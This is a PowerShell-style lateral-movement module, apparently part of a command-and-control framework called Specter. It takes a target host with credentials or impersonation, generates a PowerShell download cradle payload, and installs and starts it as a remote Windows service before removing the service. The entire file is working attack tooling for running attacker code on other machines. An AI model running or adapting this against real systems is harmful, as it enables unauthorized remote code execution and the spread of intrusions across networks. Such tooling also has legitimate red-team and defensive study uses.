param(
    [Parameter(ParameterSetName="Impersonate", Mandatory=$True, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The IP address or hostname of the system to run the cradle.")]
    [ValidateNotNullOrEmpty]
    [string]$Target,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The local or domain username to authenticate with.")]
    [ValidateNotNullOrEmpty]
    [string]$Username,

    [Parameter(ParameterSetName="Username and Password", Mandatory=$True, HelpMessage="The password for the specified user.")]
    [ValidateNotNullOrEmpty]
    [string]$Password,

    [Parameter(ParameterSetName="Impersonate", Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [ValidateNotNullOrEmpty()]
    [Build]
    [string]$Build,

    [Parameter(ParameterSetName="Impersonate", Mandatory = $true, HelpMessage = "The name of the service to create on the remote system.")]
    [Parameter(ParameterSetName="Username and Password", Mandatory = $true, HelpMessage = "The name of the service to create on the remote system.")]
    [ValidateNotNullOrEmpty()]
    [string]$ServiceName = "SpecterSvc"
)

load common;
load lateral;

#Generate a new PowerShell cradle command
$cradle = payload -Build $Build -Kind 'ps_command';
#$cradle = $cradle.Replace("\", "\\");
#$cradle = $cradle.Replace('"', '\"');
$command = "C:\Windows\System32\cmd.exe /c $cradle";

#Copy the payload to the remote system
try {
    if([string]::IsNullOrEmpty($Username)) {
        #Create the service
        Create-Service -ComputerName $Target -ServiceName $ServiceName -Path $command -NoStart:$false;
    } else {
        #Create the service
        Create-Service -ComputerName $Target -ServiceName $ServiceName -Path $command -Username $Username -Password $Password -NoStart:$false;
    }
    $success = $true;
} catch {
    $success = $false;
    throw;
} finally {
    Remove-Service -Name $ServiceName;
}

New-Object psobject -Property @{
    Lateral = New-Object psobject -Property @{
        Method = "System Sevice";
        ServiceName = $serviceName;
        Payload = 'ps_cradle';
        System = $Target;
        Username = $Username;
        Success = $success;
    };
};